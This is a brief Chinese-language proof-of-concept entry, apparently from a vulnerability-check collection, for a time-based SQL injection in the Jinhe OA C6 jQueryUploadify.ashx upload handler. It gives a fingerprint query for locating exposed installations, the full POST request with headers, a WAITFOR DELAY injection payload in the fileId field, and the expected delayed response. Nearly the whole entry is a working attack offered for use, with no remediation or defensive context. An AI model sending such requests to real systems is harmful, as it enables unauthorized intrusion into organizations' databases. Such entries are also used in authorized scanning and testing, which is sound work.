# 金和OAC6jQueryUploadify.ashx存在sql注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx  HTTP/1.1`
- **关键头**：`Cookie: ASPSESSIONIDQAASCTSC=CDDDLNIDCICNGCGNCKGOCFED; ASP.NET_SessionId=kd54w30nqakczun…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 45`

**请求体 / payload**
```
type=delete&fileId=1';WAITFOR+DELAY'0:0:3'--+
```
- **预期**：200　|　响应时间>=3s